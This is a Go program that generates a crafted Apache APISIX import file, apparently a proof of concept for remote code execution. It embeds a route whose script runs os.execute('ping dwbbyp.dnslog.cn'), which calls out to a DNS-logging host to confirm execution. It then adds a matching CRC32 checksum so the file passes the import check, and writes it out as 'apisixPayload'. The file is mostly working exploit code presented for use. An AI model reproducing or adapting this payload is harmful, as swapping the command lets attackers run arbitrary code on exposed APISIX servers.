package main

import (
    "encoding/binary"
    "fmt"
    "hash/crc32"
    "io/ioutil"
    "os"
)
func main() {
    gen()
}
func gen() {
    data := []byte(`{"Counsumers":[],"Routes":[{"id":"397919338339762880","create_time":1646708008,"update_time":1646708008,"uris":["/greetdawnrce2"],"name":"greetdawnrce2","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('ping dwbbyp.dnslog.cn')","script_id":"397919338339762880","upstream_id":"397811130833044159","status":1}],"Services":[],"SSLs":[],"Upstreams":[{"id":"397811130833044159","create_time":1646643511,"update_time":1646643511,"nodes":[{"host":"192.168.32.132","port":3000,"weight":1}],"timeout":{"connect":6,"read":6,"send":6},"type":"roundrobin","scheme":"http","pass_host":"pass","name":"greetdawn"}],"Scripts":[{"id":"397919338339762880","script":"os.execute('ping dwbbyp.dnslog.cn')"}],"GlobalPlugins":[{"id":"1","create_time":1646646463,"update_time":1646649397,"plugins":{"batch-requests":{"disable":false}}}],"PluginConfigs":[]}`)
    checksumUint32 := crc32.ChecksumIEEE(data)
    checksumLength := 4
    checksum := make([]byte, checksumLength)
    binary.BigEndian.PutUint32(checksum, checksumUint32)
    fileBytes := append(data, checksum...)

    content := fileBytes
    fmt.Println(content)

    importData := content[:len(content)-4]
    checksum2 := binary.BigEndian.Uint32(content[len(content)-4:])
    if checksum2 != crc32.ChecksumIEEE(importData) {
        fmt.Println(checksum2)
        fmt.Println(crc32.ChecksumIEEE(importData))
        fmt.Println("Check sum check fail, maybe file broken")
        return
    }
    err := ioutil.WriteFile("apisixPayload", content, os.ModePerm)
    if err != nil {
        fmt.Println("error!!")
        return
    }
}